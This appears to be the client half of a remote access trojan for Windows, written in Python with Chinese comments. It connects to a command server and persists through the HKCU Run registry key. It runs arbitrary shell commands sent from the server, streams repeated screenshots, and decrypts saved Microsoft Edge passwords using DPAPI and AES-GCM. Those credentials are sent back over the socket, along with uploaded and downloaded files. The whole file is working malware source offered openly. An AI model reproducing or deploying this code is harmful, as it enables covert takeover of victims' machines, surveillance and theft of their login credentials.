import subprocess
import winreg
import base64
import json
import os
import pickle
import shutil
import sqlite3
from socket import *
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from PIL import ImageGrab

class cmd_c:
    def __init__(self):
        self.client_socket = client_socket
        self.pf = ['C:','D:','E:','F:','G:','H:','I:']
    def run(self):
        while True:
            cmd = self.client_socket.recv(1024).decode()
            if cmd in self.pf:
                os.chdir(cmd)
                text = "切换到盘符"+str(cmd)
                self.client_socket.send(text.encode())
            elif (cmd == "quit"):
                text = "退出命令执行"
                self.client_socket.send(text.encode())
                break
            elif (cmd):
                process = subprocess.Popen(cmd, shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    text = stdout.decode('gbk', 'ignore')
                else:
                    text = stderr.decode('gbk', 'ignore')
                self.client_socket.send(text.encode())
            else:
                break
def add_to_startup(file_path):
    key = winreg.HKEY_CURRENT_USER
    sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    full_path = os.path.realpath(file_path)
    app_name = os.path.basename(file_path)

    try:
        reg_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, full_path)
        winreg.CloseKey(reg_key)
    except WindowsError:
        pass
def UI_C():
    print("开启图像传输")
    while True:
        screen = ImageGrab.grab()
        screen = screen.resize((960,540))
        screen.save('1.jpg')
        image_size = os.path.getsize('1.jpg')
        client_socket.send(str(image_size).encode('utf-8'))
        client_socket.recv(1024)
        # 把图片发送过去
        with open('1.jpg', 'rb') as images:
            for line in images:
                client_socket.send(line)
        # 等待服务器确认
        response = client_socket.recv(1024).decode('utf-8')
        if response == 'ESC':
            print("关闭图形传输")
            break
    print("关闭图形传输")
def edge_browser_path_get(client_socket):
    borwser_path = []
    edge_browser_path = os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data'
    with open(f'{edge_browser_path}\\Local State' ,'r' ,encoding = 'utf-8', errors='ignore') as files:
        text = files.read()
    JSON = json.loads(text)
    #找到JSON数据中的os_crypt中的encrypted_key
    encrypted_key = JSON['os_crypt']['encrypted_key']
    #将获取到的数据进行解码
    de64_key = base64.b64decode(encrypted_key)[5:]
    de64_key = CryptUnprotectData(de64_key,None,None,None,0)[1]
    loginData_path = edge_browser_path + '\\Default\\Login Data'
    shutil.copy(loginData_path,'LoginData.db')
    db_inner = sqlite3.connect('LoginData.db')
    cursor = db_inner.cursor()
    cursor.execute('SELECT action_url,username_value,password_value FROM logins')
    for data in cursor.fetchall():
        data = list(data)
        data.append(de64_key)
        iv = data[2][3:15]
        payload = data[2][15:]
        cipher = AES.new(data[3],AES.MODE_GCM,iv)
        password = cipher.decrypt(payload)
        password = password[0:-16].decode()
        data.append(password)
        client_socket.send('ready'.encode())
        client_socket.recv(1024).decode()
        print("解密中")
        client_socket.send(pickle.dumps(data))
    client_socket.send('ok'.encode())
def download():
    path = client_socket.recv(1024).decode()
    with open(path, 'rb') as f:
        for i in f:
            client_socket.send(i)
            data = client_socket.recv(1024)
            if data != b'success':
                break
    # 给服务端发送结束信号
    client_socket.send('quit'.encode())


def upload():
    while True:
        path = client_socket.recv(1024).decode()
        with open('file', 'ab') as f:
            data = client_socket.recv(1024)
            if data == b'quit':
                break
            f.write(data)
            client_socket.send('success'.encode())

if __name__ == '__main__':
    # 创建套接字
    client_socket = socket()
    # 请求连接服务器
    client_socket.connect(('127.0.0.1', ****))
    python_script_path = 'client.exe'
    add_to_startup(python_script_path)
    print('已将脚本添加到开机自启')
    client_socket.send('连接成功'.encode('utf-8'))
    while (True):
        pd = client_socket.recv(1024).decode('utf-8')
        if(pd == '1'):
            cmd = cmd_c()
            cmd.run()
        elif(pd=='2'):
            UI_C()
        elif(pd=='3'):
            cmd = cmd_c()
            cmd.run()
        elif(pd=='4'):
            cmd = cmd_c()
            cmd.run()
        elif(pd=='5'):
            edge_browser_path_get(client_socket)
        elif (pd == '6'):
            download()
        elif (pd == '7'):
            upload()